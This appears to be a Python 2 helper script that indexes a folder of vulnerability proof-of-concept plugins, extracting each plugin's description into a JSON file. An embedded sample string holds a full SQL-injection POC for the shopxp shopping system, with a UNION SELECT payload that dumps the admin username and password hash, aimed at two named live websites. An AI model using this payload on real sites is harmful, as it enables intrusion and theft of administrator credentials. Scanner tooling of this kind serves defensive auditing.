# -*- coding:utf-8 -*-

import re

import os,uuid,json
if __name__ == '__main__':
    str1 = """
#_PlugName_ = shopxp网上购物系统 v7.4 SQL爆管理员账户密码
#_FileName_ = shopxp.py
'''
    Name = 'shopxp网上购物系统 SQL注入漏洞'
    Description = 'shopxp网上购物系统 SQL注入漏洞'
    Product = 'shopxp网上购物系统'
    References = ''
    DisclosureDate = ''
    MapXQuery = 'app="shopxp"'
'''
import re
def assign(service, arg):
    if service == "shopxp":
		return True, arg

def audit(args):
	payload = "TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin"
	url = args + payload
	code, head, res, errcode, final_url = curl.curl(url)
	m = re.search('[0-9a-zA-Z]{16,31}', res)
	if code == 200 and m!=None:
		security_hole('sql injection:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('shopxp', 'http://www.yingzhilv.com/')[1])
	audit(assign('shopxp', 'http://www.4007051668.com/')[1])
"""
    #str = "Description = 'shopxp网上购物系统 SQL注入漏洞'"
    #pattern = re.compile(r'Descrition = \'([\s\S]*)\']')
    list = []
    path = "/Users/margin/Desktop/公司/工作文件/公司内部产品/云图/整理好的POC/all/"
    fileNames = os.listdir(path)
    for name in fileNames:
        if ".py" in name and name != "__init__.py":
            s = open(path+name).read()
            pattern = re.search(r'Description = \'([\s\S]*)\'',s)
            if not pattern:
                print name
                continue
            a = pattern.group()
            commont = a.split('\n')[0].replace("Description = '","").replace("'","")
            id = str(uuid.uuid1())
            dic = {'id':id,'poc_name':name,'description':commont}
            list.append(dic)
    file_object = open('thefile.json', 'w')
    file_object.write(json.dumps(list))
    file_object.close( )
    print len(list)